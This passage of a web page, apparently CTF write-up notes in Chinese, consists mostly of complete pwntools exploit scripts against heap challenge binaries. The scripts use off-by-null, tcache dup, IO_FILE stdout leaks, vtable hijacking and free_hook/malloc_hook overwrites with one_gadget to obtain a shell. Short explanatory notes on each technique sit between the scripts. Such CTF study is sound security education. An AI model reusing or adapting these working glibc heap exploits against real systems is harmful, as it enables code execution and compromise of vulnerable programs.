class="string">'./children_tcache'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x500</span>,<span class="string">'a'</span>)</span><br><span class="line">new(<span class="number">0x28</span>,<span class="string">'a'</span>)</span><br><span class="line">new(<span class="number">0x4f0</span>,<span class="string">'a'</span>)</span><br><span class="line">new(<span class="number">0x20</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">0x28</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite the pre_chunk_in_use and pre_size</span></span><br><span class="line"><span class="comment">#clean pre_size</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x20</span>+<span class="number">8</span>-i,<span class="string">'a'</span>*(<span class="number">0x20</span>+<span class="number">8</span>-i))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0x20</span>+<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x20</span> + <span class="string">'\x40\x05'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unsorted bin Merging forward</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x500</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x3ebc40</span></span><br><span class="line">log.success(<span class="string">'libc_base addr : 0x%x'</span>%libc_base)</span><br><span class="line">free_hook = libc_base + <span class="number">0x3ed8e8</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line">log.success(<span class="string">'free_hook addr : 0x%x'</span>%free_hook)</span><br><span class="line">log.success(<span class="string">'one_gadget addr : 0x%x'</span>%one_gadget)</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache dup</span></span><br><span class="line">new(<span class="number">0x28</span>,<span class="string">'a'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#hijack free_hook to one_gadget</span></span><br><span class="line">new(<span class="number">0x28</span>,p64(free_hook))</span><br><span class="line">new(<span class="number">0x28</span>,<span class="string">'a'</span>)</span><br><span class="line">new(<span class="number">0x28</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger one_gadget</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="tcache-libc-2-27-off-by-null-没有打印函数-IO-FILE结构体泄露地址"><a href="#tcache-libc-2-27-off-by-null-没有打印函数-IO-FILE结构体泄露地址" class="headerlink" title="tcache + libc-2.27 + off by null + 没有打印函数 + IO_FILE结构体泄露地址"></a>tcache + libc-2.27 + off by null + 没有打印函数 + IO_FILE结构体泄露地址</h2><ul>
<li><p>off by null漏洞，但是没有了打印函数，所以要想办法泄漏libc，然后这里利用IO_FILE结构体去泄漏地址</p>
</li>
<li><p>然后修改tcache的fd指针指向<em>IO_2_1_stdout</em>结构体修改_IO_write_base地址就能泄漏地址根据偏移来获得libc基址，然后后面还是一样用double free来修改free_hook为one_gadget来getshell，这里要注意修改结构体的时候flags要过校验，而且fd指针的地址跟<em>IO_2_1_stdout</em>结构体地址需要爆破1位</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#_IO_FILE flags</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC         0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC_MASK    0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_BUF          0x0001 <span class="comment">/* Don't deallocate buffer on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_UNBUFFERED        0x0002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_READS          0x0004 <span class="comment">/* Reading not allowed.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES         0x0008 <span class="comment">/* Writing not allowed.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_EOF_SEEN          0x0010</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_ERR_SEEN          0x0020</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_DELETE_DONT_CLOSE 0x0040 <span class="comment">/* Don't call close(_fileno) on close.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINKED            0x0080 <span class="comment">/* In the list of all open files.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IN_BACKUP         0x0100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINE_BUF          0x0200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_TIED_PUT_GET      0x0400 <span class="comment">/* Put and get pointer move in unison.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING      0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_FILEBUF        0x2000</span></span><br><span class="line">                           <span class="comment">/* 0x4000  No longer used, reserved for compat.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_LOCK         0x8000</span></span><br><span class="line"></span><br><span class="line">_flags=_IO_MAGIC+_IO_CURRENTLY_PUTTING+_IO_IS_APPENDING+（_IO_LINKED）</span><br><span class="line"></span><br><span class="line">_flags=<span class="number">0xfbad1800</span> <span class="keyword">or</span> <span class="number">0xfbad1880</span> 或者再加一些其他不影响leak的_flags</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        p = process(<span class="string">'./baby_tcache'</span>)</span><br><span class="line"></span><br><span class="line">        new(<span class="number">0x500</span>,<span class="string">'a'</span>)</span><br><span class="line">        new(<span class="number">0x78</span>,<span class="string">'a'</span>)</span><br><span class="line">        new(<span class="number">0x4f0</span>,<span class="string">'a'</span>)</span><br><span class="line">        new(<span class="number">0x20</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#unsorted bin</span></span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        new(<span class="number">0x78</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#overwrite the pre_chunk_in_use and pre_size</span></span><br><span class="line">        <span class="comment">#clean pre_size</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">            delete(<span class="number">0</span>)</span><br><span class="line">            new(<span class="number">0x70</span>+<span class="number">8</span>-i,<span class="string">'a'</span>*(<span class="number">0x70</span>+<span class="number">8</span>-i))</span><br><span class="line"></span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        new(<span class="number">0x72</span>,<span class="string">'a'</span>*<span class="number">0x70</span> + <span class="string">'\x90\x05'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#unsorted bin Merging forward</span></span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#hijack fd -&gt; _IO_2_1_stdout_</span></span><br><span class="line">        new(<span class="number">0x500</span>,<span class="string">'a'</span>)</span><br><span class="line">        new(<span class="number">0x88</span>,<span class="string">'\x60\xc7'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#hijack _IO_write_base to leak libc</span></span><br><span class="line">        new(<span class="number">0x78</span>,<span class="string">'a'</span>)</span><br><span class="line">        fake__IO_2_1_stdout_ = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">"\x00"</span></span><br><span class="line">        <span class="comment">#gdb.attach(p)</span></span><br><span class="line">        new(<span class="number">0x78</span>,fake__IO_2_1_stdout_)</span><br><span class="line">        libc_base = u64(p.recv(<span class="number">0x30</span>)[<span class="number">8</span>:<span class="number">16</span>]) - <span class="number">0x3ed8b0</span></span><br><span class="line">        log.success(<span class="string">'libc_base addr : 0x%x'</span>%libc_base)</span><br><span class="line">        free_hook = libc_base + <span class="number">0x3ed8e8</span></span><br><span class="line">        one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line">        log.success(<span class="string">'free_hook addr : 0x%x'</span>%free_hook)</span><br><span class="line">        log.success(<span class="string">'one_gadget addr : 0x%x'</span>%one_gadget)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#double free</span></span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#hijack free_hook -&gt; one_gadget</span></span><br><span class="line">        new(<span class="number">0x88</span>,p64(free_hook))</span><br><span class="line">        new(<span class="number">0x88</span>,<span class="string">'a'</span>)</span><br><span class="line">        new(<span class="number">0x88</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">        <span class="comment">#trigger one_gadget</span></span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        p.interactive()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>



<h2 id="劫持vtable-libc-2-23-off-by-null-chunk-size-lt-0x120"><a href="#劫持vtable-libc-2-23-off-by-null-chunk-size-lt-0x120" class="headerlink" title="劫持vtable + libc-2.23 + off by null + chunk_size&lt;= 0x120"></a>劫持vtable + libc-2.23 + off by null + chunk_size&lt;= 0x120</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">context.binary = <span class="string">'./domo'</span></span><br><span class="line">elf = ELF(<span class="string">'./domo'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./domo'</span>)</span><br><span class="line">libc = context.binary.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd_add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size:'</span>,str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd_del</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd_show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:\n'</span>,str(index))</span><br><span class="line">    <span class="keyword">return</span> p.recv(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd_edit</span><span class="params">(addr,num)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'addr:'</span>,str(addr))</span><br><span class="line">    p.sendlineafter(<span class="string">'num:'</span>,num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak_libc</span></span><br><span class="line">cmd_add(<span class="number">0x80</span>,<span class="string">''</span>) <span class="comment">#0</span></span><br><span class="line">cmd_add(<span class="number">0x10</span>,<span class="string">''</span>) <span class="comment">#1</span></span><br><span class="line">cmd_del(<span class="number">0</span>)</span><br><span class="line">cmd_add(<span class="number">0x80</span>,<span class="string">''</span>) <span class="comment">#0</span></span><br><span class="line">realloc_hook = u64(cmd_show(<span class="number">0</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0x2</span></span><br><span class="line">libc_base = realloc_hook - libc.sym[<span class="string">"__realloc_hook"</span>]</span><br><span class="line">print(hex(libc_base))</span><br><span class="line"><span class="comment"># leak_heap</span></span><br><span class="line">cmd_add(<span class="number">0x10</span>,<span class="string">''</span>) <span class="comment">#2</span></span><br><span class="line">cmd_add(<span class="number">0x10</span>,<span class="string">''</span>) <span class="comment">#3</span></span><br><span class="line">cmd_del(<span class="number">2</span>)</span><br><span class="line">cmd_del(<span class="number">3</span>)</span><br><span class="line">cmd_add(<span class="number">0x10</span>,<span class="string">''</span>) <span class="comment">#2</span></span><br><span class="line">cmd_add(<span class="number">0x10</span>,<span class="string">''</span>) <span class="comment">#3</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">heap_addr = u64(cmd_show(<span class="number">2</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0xa</span> + <span class="number">0x100</span></span><br><span class="line">print(hex(heap_addr))</span><br><span class="line"><span class="comment"># unlink_chunk_overlap</span></span><br><span class="line">cmd_add(<span class="number">0x40</span>,flat(<span class="number">0</span>,<span class="number">0xb1</span>,heap_addr+<span class="number">0x18</span>,heap_addr+<span class="number">0x20</span>,heap_addr+<span class="number">0x10</span>)) <span class="comment">#4</span></span><br><span class="line">cmd_add(<span class="number">0x60</span>,<span class="string">''</span>) <span class="comment">#5</span></span><br><span class="line">cmd_add(<span class="number">0xf0</span>,<span class="string">''</span>) <span class="comment">#6</span></span><br><span class="line">cmd_add(<span class="number">0x10</span>,<span class="string">''</span>) <span class="comment">#7</span></span><br><span class="line">cmd_del(<span class="number">5</span>)</span><br><span class="line">cmd_add(<span class="number">0x68</span>,flat(<span class="string">"\x00"</span>*<span class="number">0x60</span>,<span class="number">0xb0</span>)) <span class="comment">#5</span></span><br><span class="line">cmd_del(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment"># fastbin_attack</span></span><br><span class="line">cmd_del(<span class="number">5</span>)</span><br><span class="line">attack_addr = libc_base+libc.sym[<span class="string">"_IO_2_1_stdin_"</span>] + <span class="number">160</span> - <span class="number">3</span></span><br><span class="line">one_gadgets = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget = libc_base + one_gadgets[<span class="number">2</span>]</span><br><span class="line">print(hex(attack_addr))</span><br><span class="line">cmd_add(<span class="number">0x80</span>,flat(<span class="string">"\x00"</span>*<span class="number">0x30</span>,<span class="number">0</span>,<span class="number">0x71</span>,attack_addr)) <span class="comment">#5</span></span><br><span class="line">cmd_del(<span class="number">1</span>)</span><br><span class="line">cmd_del(<span class="number">2</span>)</span><br><span class="line">cmd_del(<span class="number">3</span>)</span><br><span class="line">cmd_add(<span class="number">0xa0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(one_gadget)*<span class="number">12</span>) <span class="comment">#1</span></span><br><span class="line">cmd_add(<span class="number">0x60</span>,<span class="string">''</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *'</span>+str(one_gadget))</span><br><span class="line">cmd_add(<span class="number">0x60</span>,<span class="string">"\x00"</span>*<span class="number">3</span>+flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xffffffff</span>,<span class="number">0</span>,<span class="number">0</span>,heap_addr+<span class="number">0xb0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)) <span class="comment">#6</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="stdout-leak-realloc-hook-调栈-add-delete"><a href="#stdout-leak-realloc-hook-调栈-add-delete" class="headerlink" title="stdout leak + realloc_hook 调栈 + add/delete"></a>stdout leak + realloc_hook 调栈 + add/delete</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">p = process(<span class="string">"./pwn1"</span>)</span><br><span class="line">context.binary = <span class="string">"./pwn1"</span></span><br><span class="line">libc = context.binary.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name_size,name=<span class="string">b'a'</span>,message=<span class="string">b'b'</span>)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'choice : '</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'your name: \n'</span>,str(name_size))</span><br><span class="line">	p.sendafter(<span class="string">'Your name:\n'</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">'Your message:\n'</span>,message)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'choice : '</span>,<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'index:'</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pr</span><span class="params">(a,addr)</span>:</span></span><br><span class="line">	log.success(a+<span class="string">'===&gt;'</span>+hex(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(one)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">'b *'</span>+str(one))</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment">#0</span></span><br><span class="line">	add(<span class="number">0x90</span>) <span class="comment">#1</span></span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment">#2</span></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">b'\xdd\x55'</span>) <span class="comment">#3</span></span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">b'\x00'</span>) <span class="comment">#4</span></span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment">#5</span></span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment">#6</span></span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment">#7</span></span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">b'a'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b'\x00'</span>)</span><br><span class="line">	libcbase=u64(p.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))<span class="number">-0x39c600</span></span><br><span class="line">	libc_realloc = libcbase + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">	malloc_hook = libcbase + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">	one = libcbase + [<span class="number">0x3f3d6</span>,<span class="number">0x3f42a</span>,<span class="number">0xd5bf7</span>][<span class="number">2</span>]</span><br><span class="line">	pr(<span class="string">'libcbase'</span>,libcbase)</span><br><span class="line">	pr(<span class="string">'malloc_hook'</span>,malloc_hook)</span><br><span class="line">	pr(<span class="string">'one'</span>,one)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	<span class="comment">#debug(one)</span></span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">b'a'</span>*<span class="number">11</span>+p64(one)+p64(libc_realloc+<span class="number">14</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">'choice : '</span>,<span class="string">'1'</span>)</span><br><span class="line">	<span class="comment">#gdb.attach(p,'b *'+str(one))</span></span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>



